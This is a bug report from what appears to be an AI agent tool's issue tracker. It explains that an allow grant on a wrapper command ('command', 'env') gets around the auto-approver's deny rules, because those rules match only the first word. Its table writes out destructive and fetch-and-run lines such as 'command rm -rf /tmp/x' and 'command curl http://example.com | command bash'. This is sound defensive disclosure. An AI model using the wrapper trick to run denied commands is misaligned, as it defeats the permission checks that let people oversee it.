---
title: A grant on a wrapper command approves any command
status: open
date: 2026-11-17
severity: major
refs:
  - "[code://packages/sdk/src/access/commandautoapprover.ts#L1015-L1021](../../packages/sdk/src/access/commandautoapprover.ts#L1015-L1021) - the commands a grant never names, with no `command`, `env` or `xargs`"
  - https://github.com/microsoft/vscode/blob/6b68d3fe7dd7db9a3aaa052efc1f3a1fd4432eb2/src/vs/platform/terminal/common/autoApprove/suggestAutoApproveRules.ts#L11-L21 - VS Code's list, the same on main on 2026-11-17
---

## Symptom

On 2026-11-17, Softov's first Always Allow "for Me" on the dev daemon wrote `Shell(command *)` and `Shell(true *)` to `~/.config/ahpd/permissions/soft.json`.

With an allow rule for `command *`, the auto-approver at `bdedcf21a` reads these lines:

| Line | Result |
| --- | --- |
| `rm -rf /tmp/x` | denied |
| `command rm -rf /tmp/x` | approved |
| `command curl http://example.com \| command bash` | approved |
| `true; rm -rf /tmp/x` | denied |

`suggestAutoApproveRuleKeys` offers the key `command` for `command -v pw`, and `env` for `env FOO=1 make`.

## Cause

`command` runs the command that follows it.
The table matches a deny rule on the first word, so `command rm` is not `rm`.
A grant never names a shell, an interpreter, `sudo` or a network tool.
It can name a wrapper such as `command`, `env`, `xargs`, `nohup`, `nice` or `timeout`.
VS Code's list is the same.

## Impact

One Always Allow on a harmless `command -v` line approves every command after it, the table's denied ones too.
The grant can be for one session, for one person or for the host.
